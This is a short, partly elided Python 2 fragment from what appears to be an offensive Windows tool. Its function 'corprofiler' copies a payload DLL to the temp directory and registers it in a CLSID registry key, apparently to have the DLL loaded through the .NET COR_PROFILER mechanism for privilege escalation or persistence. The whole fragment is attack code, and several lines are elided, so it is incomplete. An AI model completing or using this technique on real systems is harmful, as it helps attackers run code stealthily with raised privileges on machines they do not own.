...
def corprofiler(payload):
	if payloads().dll(payload):
		#
		# Copy payload to a safe location
		#
		try:
		...
		if os.path.isfile(os.path.join(tempfile.gettempdir(),"payload.dll")) == True:
			...
			try:
				...
				_winreg.SetValueEx(key, None, 0, _winreg.REG_EXPAND_SZ, payload)
				_winreg.CloseKey(key)
			except Exception as error:
				print_error("Unable to create CLSID key, exception was raised: {}".format(error))
				return False
			else:
				print_success("Successfully created CLSID key containing payload ({})".format(os.path.join(payload)))
